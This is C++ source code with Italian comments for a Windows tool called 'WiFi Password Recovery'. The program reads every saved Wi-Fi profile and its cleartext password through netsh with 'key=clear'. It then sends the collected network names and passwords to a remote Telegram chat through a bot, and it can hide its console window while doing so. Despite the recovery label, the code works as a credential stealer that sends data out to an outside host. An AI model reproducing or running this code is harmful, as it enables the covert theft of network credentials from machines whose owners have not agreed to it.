#include <iostream>
#include <windows.h>
#include <essentials.h> // Libreria per semplificare avriate funzioni
#include <EssCurl.h> // Libreria per semplificare l'utilizzo di CURL, in questo caso verrà usata per il bot Telegram

using namespace std;

string GetChatID(TelegramBot&, Log&); // Prototipo della funzione per ottenere il ChatID
void CheckUpdate(string, Log&); // Prototipo per controllare gli Update

int main()
{	
	GeneralUtils gu; // Classe di essentials per diverse utility generali
	TelegramBot tb; // Classe di EssCurl per semplificare l'utilizzo di un bot Telegram
	SimpleFileSettings sfs("settings.ini"); // Classe di essentials per utilizzare un file di settaggi in modo semplificato
	ConsoleUtils cu; // Classe di essentials per diverse utility sulla console di Windows
	EasyMSGB msgb; // Classe di essentials per semplificare l'utilizzo dei MessageBox
	Log lg("WPR.log", true); // Classe di essentials per gestire in maniera semplice un sistema di log
	
	lg.RWFile(); // Sbianco il file di log
	lg.WriteLog("Inizializzazione."); // Scrivo sul file di log
	string ChatID;
	string buffer;
	string Versione="1.0.2"; // Versione locale del programma
	bool Debug=false;
	vector<string> SSID; // Utilizzo i vettori per l'allocazione dinamica (e perché sono belli :3)
	vector<string> Password;
	
	cu.ConsoleTitle("WiFi Password Recovery ~ by Criper98"); // Cambio il titolo della finestra di console
	tb.BotToken="123:ABC";
	
	if(sfs.CheckFile())
		if(sfs.GetSetting("SetChatID") == "true") // Se "true" avvia la procedura per associare la chat a cui il bot deve mandare il messaggio
		{
			lg.WriteLog("ChatID non impostato, inizio procedura di associazione.");
			
			sfs.SetSetting("Chat_ID", GetChatID(tb, lg));
			if(sfs.GetSetting("Chat_ID") == "-1") // Non succede, ma se succede...
			{
				lg.WriteLog("[Errore] - Associazione ChatID fallita.");
				cout<<"Qualcosa e' andato storto durante l'associazione."<<endl;
				Sleep(3000);
				return 0;
			}
			sfs.SetSetting("SetChatID", "false");
			lg.WriteLog("ChatID associato.");
		}
	else if(!sfs.CheckFile())
	{
		lg.WriteLog("[Errore] - Impossibile accedere al file \"settings.ini\".");
		cout<<"Impossibile accedere al file \"settings.ini\"..."<<endl;
		Sleep(3000);
		return 0;
	}
	
	if(sfs.GetSetting("DebugMode") == "true")
		Debug=true;
	if(sfs.GetSetting("CheckUpdate") == "true")
		CheckUpdate(Versione, lg);
	if(sfs.GetSetting("HideConsole") == "true")
		cu.HideConsole();
	
	ChatID=sfs.GetSetting("Chat_ID"); // Leggo l'ID della chat a cui mandare il messaggio Telegram
	
	if(gu.NoOutputCMD("ping api.telegram.org -n 1") != 0) // Controllo che le API siano raggiungibili
	{
		lg.WriteLog("[Errore] - Impossibile raggiungere le API di Telegram.");
		msgb.Ok("Collegamento con le API di Telegram fallito.\nVerificare la connessione ad internet e riprovare.", msgb.Error, "WiFi Password Recovery");
		return 0;
	}
	
	lg.WriteLog("Esecuzione comando \"netsh wlan show profile\".");
	buffer=gu.GetCMDOutput("netsh wlan show profile"); // Eseguo il comando per ottenere i profili di rete salvati
	
	if(buffer.find("Tutti i profili utente") == string::npos) // Se non ci sono profili:
	{
		lg.WriteLog("Nessun profilo di rete wireless trovato.\n******************************\n"+buffer+"\n******************************");
		tb.SendMessage(ChatID, "La postazione non ha una scheda wireless o non ha reti salvate...");
		cout<<"La postazione non ha una scheda wireless o non ha reti salvate..."<<endl;
		if(Debug)
		{
			cout<<buffer<<endl;
			system("pause");
		}
		Sleep(3000);
		return 0;
	}
	
	lg.WriteLog("Acquisizione profili.");
	for(int i=0, j=0; buffer.find("Tutti i profili utente", i) != string::npos; j++) // Salvo su vettore i nomi dei profili di rete
	{
		SSID.push_back(SimpleFind(buffer, ": ", "\n", j)); // SimpleFind è un substr semplificato con l'implementazione delle iterazioni (j)
		i = buffer.find(": ", i)+2;
	}
	lg.WriteLog("Profili acquisiti: "+to_string(SSID.size())+".");
	
	if(Debug)
		for(int i=0; i<SSID.size(); i++)
			cout<<SSID[i]<<endl;
	
	lg.WriteLog("Aquisizione SSID e Password.");
	for(int i=0; i<SSID.size(); i++) // Salvo su vettore la password e il vero nome dell'SSID della rete
	{
		buffer=gu.GetCMDOutput("netsh wlan show profile name=\""+SSID[i]+"\" key=clear"); // Comando per ottenere i dettagli del profilo di rete specificato e mostrare in chiaro la password (se c'è)
		
		if(buffer.find("Contenuto chiave") == string::npos) // Se non c'è la password:
		{
			lg.WriteLog("Password non trovata per il profilo "+to_string(i));
			Password.push_back("Password non trovata");
			cout<<"Password non trovata per la rete "<<SSID[i]<<endl;
			if(Debug)
			{
				cout<<gu.GetCMDOutput("netsh wlan show profile name=\""+SSID[i]+"\" key=clear")<<endl;
				system("pause");
			}
		}
		else
			Password.push_back(buffer.substr(buffer.find("Contenuto chiave")+30, buffer.find("\n", buffer.find("Contenuto chiave"))-30 - buffer.find("Contenuto chiave"))); // Salvo la password sul vettore
		
		SSID[i]=buffer.substr(buffer.find("Nome SSID")+32, buffer.find("\n", buffer.find("Nome SSID"))-33 - buffer.find("Nome SSID")); // Sovrascrivo il vero SSID della rete su vettore
		if(Debug)
			cout<<SSID[i]<<"----"<<endl;
	}
	lg.WriteLog("Aquisizione terminata.");
	
	lg.WriteLog("Creazione del Buffer.");
	buffer.clear();
	for(int i=0; i<SSID.size(); i++) // Creo il messaggio da mandare su Telegram
		buffer+="SSID: "+SSID[i]+"\nPWD: "+Password[i]+"\n\n";
	lg.WriteLog("Mando il Buffer alla chat "+ChatID);
	tb.SendMessage(ChatID, buffer); // Mando il messaggio
	
	if(Debug)
	{
		for(int i=0; i<Password.size(); i++)
			cout<<Password[i]<<endl;
		system("pause");
	}
	
	return 0;
}

void CheckUpdate(string Versione, Log& lg) // Funzione per controllare la presenza di Update
{
	GitHub gh; // Classe di EssCurl per l'uso semplificato delle API di GitHub
	EasyMSGB msgb;
	GeneralUtils gu;
	
	lg.WriteLog("Verifica Update.");
	string LastRelease=gh.GetRepoTag("criper98", "wifi-password-recovery", "UserAuth"); // Ottengo il TAG più recente
	
	if(LastRelease != Versione) // Se le versioni non coincidono:
	{
		lg.WriteLog("Update trovato, versione locale ["+Versione+"], versione attuale ["+LastRelease+"]");
		if(msgb.YesNo("La versione di \"WiFi Password Recovery\" che stai usando non e' aggiornata.\nSi desidera scaricare la versione piu' recente?", msgb.Info, "Update!"))
			gu.OpenURL("https://github.com/Criper98/WiFi-Password-Recovery/releases/latest");
	}
}

string GetChatID(TelegramBot& tb, Log& lg) // Funzione per ottenere l'ID della chat al quale il bot Telegram dovrà mandare i messaggi
{
	LastMsg lm; // Struttura definita in EssCurl per salvare i dati dell'ultimo messaggio ricevuto dal bot
	GeneralUtils gu;
	int Number=gu.GetRandomNumber(999999); // Genero un numero randomico tra 0 e 999998
	
	cout<<"La chat per il bot Telegrma non e' associata.\nPer associarla scrivere al bot @WiFiPRbot il seguente codice: "<<Number<<endl;
	
	while(true) // Loop per controllare ad intervalli di 1s i nuovi messaggi ricevuti sul bot
	{
		lm=tb.GetLastMessage(); // Interrogo le API di Telegram per ottenere l'ultimo messaggio, se non ci sono nuovi messaggi tutti gli elementi di LastMsg vengono popolati con un "-1"
		
		if(lm.ChatID.find("-1") == string::npos) // Se ricevo un messaggio:
		{
			tb.UpdateID++; // Aggiorno l'ID del messaggio per segnarlo come "già letto" internamente
			if(lm.Text == to_string(Number)) // Se il messaggio ricevuto corrisponde al numero generato:
			{
				cout<<"Chat associata all'utente ["<<lm.Username<<"]"<<endl;
				tb.SendMessage(lm.ChatID, "Chat associata!");
				Sleep(1500);
				return lm.ChatID;
			}
			else
				lg.WriteLog("Codice errato, codice corretto ["+to_string(Number)+"] codice ricevuto ["+lm.Text+"].");
		}
		
		Sleep(1000);
	}
	
	return "-1"; // Non succede, ma se succede...
}
